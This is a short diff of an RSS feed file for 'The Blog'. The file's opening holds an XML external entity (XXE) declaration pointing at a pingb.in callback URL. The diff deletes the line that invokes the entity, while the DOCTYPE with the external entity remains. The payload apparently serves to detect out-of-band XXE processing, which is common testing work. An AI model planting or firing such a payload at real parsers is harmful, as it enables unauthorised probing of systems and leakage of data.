@@ -1,7 +1,6 @@
 <?xml version="1.0" encoding="ISO-8859-1"?>
     <!DOCTYPE foo [<!ELEMENT foo ANY>
     <!ENTITY xxe SYSTEM "http://pingb.in/p/d0c2e08cbcd7598a4ab8d0e21efb">]>
-    <foo>&xxe;</foo>
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
 <channel>
     <title>The Blog</title>
